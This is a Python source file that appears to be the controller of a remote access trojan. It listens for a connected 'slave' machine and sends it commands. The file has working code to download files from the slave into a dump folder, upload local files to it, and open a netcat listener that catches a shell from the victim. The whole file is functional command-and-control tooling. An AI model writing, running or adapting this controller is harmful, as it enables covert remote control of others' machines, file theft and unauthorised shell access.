#!/bin/usr/python3

import os
import sys
import socket


def get_mod_args():
    argVector = ["ip_addr", "port", "shell_port"]
    argCount = len(argVector)
    return argCount, argVector


def get_args():
    ip_addr = sys.argv[1]
    port = int(sys.argv[2])
    shell_port = int(sys.argv[3])
    return ip_addr, port, shell_port


def invalid_args_errMsg(argVector):
    args = ""
    for arg in argVector:
        args += " <" + arg + ">"
    errMsg = "Usage ./" + sys.argv[0] + args + "\n"
    return errMsg


def check_args(argCount, argVector):
    if len(sys.argv) != argCount+1:
        errMsg = invalid_args_errMsg(argVector)
        sys.stderr.write(errMsg)
        return 1
    else:
        return 0


def get_configs():
    argCount, argVector = get_mod_args()
    if check_args(argCount, argVector) == 0:
        ip_addr, port, shell_port = get_args()
        return ip_addr, port, shell_port
    sys.exit(0)


def clear():
    cmd = "clear"
    os.system(cmd)
    return 0


def check_shell(cmd):
    if cmd == "shell":
        return 0
    return 1


def drop_shell(shell_port):
    pid = os.fork()
    if pid == 0:
        clear()
        print("Dropping shell on slave machine ...")
        print("Exit netcat sending SIGINT")
        syscmd = "nc -l " + str(shell_port)
        os.system(syscmd)
    else:
        os.wait()
    sys.exit(0)


def cmd_shell(conn, ip_addr, port, shell_port):
    while True:
        cmd = ""
        while cmd == "":
            cmd = input(">>> ")
        shell = check_shell(cmd)

        dl = False
        pl = False
        if shell == 0:
            cmd += str(shell_port)
        if cmd == "clear":
            clear()
        if cmd[:2] == "dl":
            dl = True
        if cmd[:2] == "pl":
            pl = True

        try:
            conn.send(cmd.encode())
            if shell == 0:
                drop_shell(shell_port)
        except socket.error:
            sys.stderr.write("Error sending command\n")
            sys.exit(0)

        try:
            if dl == True:
                encoded_data = conn.recv(64000)
                msg = encoded_data.decode()
                # while dl == True:
                #     buf = 1024
                #     buffer = conn.recv(buf)
                #     buffer = buffer.decode()
                #     if buffer == "":
                #         dl = False
                #     else:
                #         data += buffer
                with open("dump/"+cmd[3:], "w") as fp:
                    fp.write(msg[3:])
            else:
                encoded_msg = conn.recv(1024)
                msg = encoded_msg.decode()

            if pl == True:
                clear()
                os.system("ls")
                filename = input(">>> ")
                with open(filename, "r") as fp:
                    data = fp.read()
                file = data.encode()
                conn.send(file)

            slave_ack = msg[:3]
            msg = msg[3:]
            if slave_ack != "ACK":
                sys.stderr.write(
                    "[x] Slave did not acknowledge the command\n")
            elif msg[:3] == "404":
                print("Error message from slave: %s" % (msg[3:]))
            else:
                if dl == False:
                    print(msg)
                else:
                    dl = False
        except socket.error:
            sys.stderr.write("[x] Error recving slave ackowledgement\n")


def connect(ip_addr, port):
    try:
        socketObj = socket.socket()
    except socket.error:
        sys.stderr.write("[x] Error creating socket object\n")
        sys.exit(0)

    try:
        socketObj.bind((ip_addr, port))
    except:
        sys.stderr.write("[x] Error binding socket object")
        sys.exit(0)

    try:
        clear()
        print("[*] Listening on port %d" % port)
        socketObj.listen(20)
    except socket.error:
        sys.stderr.write("[x] Error broadcasting server\n")
        sys.exit(0)

    try:
        conn, addr = socketObj.accept()
        print("[+] Connection estabilished with %s:%d" % (addr[0], addr[1]))
    except socket.error:
        sys.stderr.write("[x] Error connecting to slave\n")
        sys.exit(0)
    return conn


def bootstrap(ip_addr, port, shell_port):
    conn = connect(ip_addr, port)
    clear()
    cmd_shell(conn, ip_addr, port, shell_port)
    return 0


def main():
    ip_addr, port, shell_port = get_configs()
    bootstrap(ip_addr, port, shell_port)
    return 0


if __name__ == "__main__":
    main()
